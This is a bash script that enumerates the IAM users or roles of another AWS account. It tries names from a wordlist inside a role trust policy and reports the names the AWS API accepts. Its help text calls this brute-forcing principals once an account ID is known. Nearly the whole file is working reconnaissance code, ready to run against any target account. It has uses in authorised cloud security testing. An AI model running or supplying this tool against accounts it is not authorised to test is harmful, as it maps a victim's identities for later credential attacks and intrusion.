#!/bin/bash

TEMPLATE='{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::ACCOUNTID:TYPE/NAME"
      },
      "Action": [
        "sts:AssumeRole"
      ]
    }
  ]
}'

HELP="Use this script to BF users or roles once you have identified the ID of an account.
You can use the unauth_wordlist.txt as wordlist if you need to.
unauth_iam.sh -t <user/role> -i <account_id> -r <role_name_to_create> -w <wordlist_path>"
TYPE=""
ACCOUNTID=""
ROLE_NAME=""
WORDLIST=""

while getopts "h?t:i:r:w:" opt; do
  case "$opt" in
    h|\?) printf "%s\n\n" "$HELP"; exit 0;;
    t)  TYPE=${OPTARG};;
    i)  ACCOUNTID=${OPTARG};;
    r)  ROLE_NAME=${OPTARG};;
    w)  WORDLIST=${OPTARG};;
    esac
done

if ! [ "$TYPE" ] || ! [ "$ACCOUNTID" ] || ! [ "$ROLE_NAME" ] || ! [ "$WORDLIST" ]; then
    printf "%s\n\n" "$HELP"; 
    exit 0;
fi

if echo "$TYPE" | grep -vqE "user|role"; then
    echo "Type can only be role or user"
    printf "%s\n\n" "$HELP"; 
    exit 0;
fi

if [ ! -f "$WORDLIST" ]; then
    echo "Wordlist file not found!"
    printf "%s\n\n" "$HELP"; 
    exit 0;
fi



while read -r NAME; do
    printf "\rTrying $NAME"
    echo "$TEMPLATE" | sed -e "s,ACCOUNTID,$ACCOUNTID," | sed -e "s,TYPE,$TYPE," | sed -e "s,NAME,$NAME," > /tmp/create_role.json
    if aws iam create-role --role-name "$ROLE_NAME" --assume-role-policy-document file:///tmp/create_role.json 2>/dev/null | grep -q "Statement"; then
        echo ""
        echo "Found $TYPE/$NAME"
    fi
    aws iam delete-role --role-name "$ROLE_NAME" 2>/dev/null
done < $WORDLIST

rm /tmp/create_role.json 2>/dev/null
